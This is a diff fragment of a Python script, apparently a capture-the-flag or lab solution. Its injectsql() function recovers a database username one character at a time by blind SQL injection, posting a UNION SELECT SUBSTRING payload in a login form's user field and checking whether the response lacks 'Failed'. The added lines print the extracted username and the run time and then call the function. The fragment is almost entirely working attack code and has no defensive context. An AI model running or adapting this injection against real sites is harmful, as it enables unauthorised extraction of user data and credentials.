@@ -19,3 +19,18 @@ def injectsql():
         for c in char:
             request = session.post(url, data={'user': f"' UNION SELECT null,SUBSTRING(username, {length}, 1) AS ExtractString FROM user WHERE SUBSTRING(username, {length},1) = '{c}' LIMIT 1#",'pass':'1234'})
             response = request.text
+            print(f"Texting: {c}")
+            # Found a match
+            if not 'Failed' in response:
+                print(flag)
+                flag = flag + c
+                break
+        
+        length += 1
+    
+    print('Username:', flag)
+    end = time.time()
+    rt = end - start
+    print('Response time: ', rt)
+
+injectsql()
